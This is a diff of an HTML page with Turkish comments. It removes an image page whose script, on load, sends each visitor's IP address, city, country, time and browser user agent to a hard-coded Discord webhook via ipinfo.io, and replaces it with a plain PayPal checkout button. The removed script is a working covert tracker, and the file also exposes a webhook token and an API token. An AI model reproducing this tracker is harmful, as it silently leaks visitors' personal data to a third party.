@@ -1,71 +1,20 @@
-<!DOCTYPE html>
-<html lang="tr">
-<head>
-  <meta charset="UTF-8">
-  <title>🍉</title>
-  <style>
-    body {
-      margin: 0;
-      padding: 0;
-      background-color: #000;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
+<script src="https://www.paypal.com/sdk/js?client-id=ATGtT2kVQE5zW49ZzWGRzaq4p0y8kwezf6N7O5CuxbJgfJbVtb9yI-Rkqcei-zJL-K7n-UCBzQX-2CsH&currency=USD"></script>
+<div id="paypal-button-container"></div>
+<script>
+  paypal.Buttons({
+    createOrder: function(data, actions) {
+      return actions.order.create({
+        purchase_units: [{
+          amount: {
+            value: '19.99' // ürün fiyatı
+          }
+        }]
+      });
+    },
+    onApprove: function(data, actions) {
+      return actions.order.capture().then(function(details) {
+        alert('Ödeme başarılı: ' + details.payer.name.given_name);
+      });
     }
-    img {
-      max-width: 100%;
-      max-height: 100%;
-    }
-  </style>
-</head>
-<body>
-  <img src="haniye.png" alt="İsmail Haniye">
-
-  <script>
-    const webhookURL = "https://discord.com/api/webhooks/1392624549148754061/Q_B5mTWna2fUbS2qMz0_9_QbdHzxC45Iljdn1cUmAWYCjycpzZWStuzORNZfoo7JkYI4";
-
-    // IP ve konum verilerini al
-    async function getVisitorInfo() {
-      try {
-        const res = await fetch("https://ipinfo.io/json?token=3b1d9e8dcaa055"); // Ücretsiz public token
-        return await res.json();
-      } catch (error) {
-        console.error("IP bilgisi alınamadı:", error);
-        return {};
-      }
-    }
-
-    // Bilgileri Discord'a gönder
-    async function sendToDiscord() {
-      const info = await getVisitorInfo();
-      const ip = info.ip || "Bilinmiyor";
-      const loc = info.city ? `${info.city}, ${info.country}` : "Konum yok";
-      const now = new Date().toLocaleString("tr-TR");
-      const browser = navigator.userAgent;
-
-      const message = `📥 Yeni Ziyaretçi:
-🌐 IP: ${ip}
-📍 Konum: ${loc}
-🕒 Zaman: ${now}
-🧭 Tarayıcı: ${browser}`;
-
-      try {
-        const res = await fetch(webhookURL, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ content: message })
-        });
-
-        if (!res.ok) {
-          console.error("Webhook gönderim hatası. Kod:", res.status);
-        }
-      } catch (err) {
-        console.error("Discord gönderim HATASI:", err);
-      }
-    }
-
-    sendToDiscord();
-  </script>
-</body>
-</html>
+  }).render('#paypal-button-container');
+</script>
